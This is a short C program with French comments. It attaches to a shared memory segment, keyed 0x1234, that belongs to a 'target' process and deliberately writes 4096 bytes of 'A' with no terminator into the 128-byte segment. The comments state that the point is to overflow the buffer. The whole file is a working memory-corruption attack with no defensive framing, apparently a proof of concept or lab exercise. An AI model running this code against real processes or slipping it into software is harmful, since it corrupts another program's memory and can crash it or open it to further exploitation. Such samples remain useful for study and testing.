#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#define SHM_KEY 0x1234

int main() {
    // Récupération du segment existant créé par la cible
    int shmid = shmget(SHM_KEY, 128, 0666);
    if (shmid < 0) return 1;

    char *shm_ptr = shmat(shmid, NULL, 0);
    if (shm_ptr == (char *) -1) return 1;

    // Remplissage de la page mémoire entière (4096 octets) avec des 'A' sans caractère de fin '\0'
    // Cela provoque un dépassement de tampon (Buffer Overflow) sur les 128 octets prévus.
    memset(shm_ptr, 'A', 4096);

    shmdt(shm_ptr);
    return 0;
}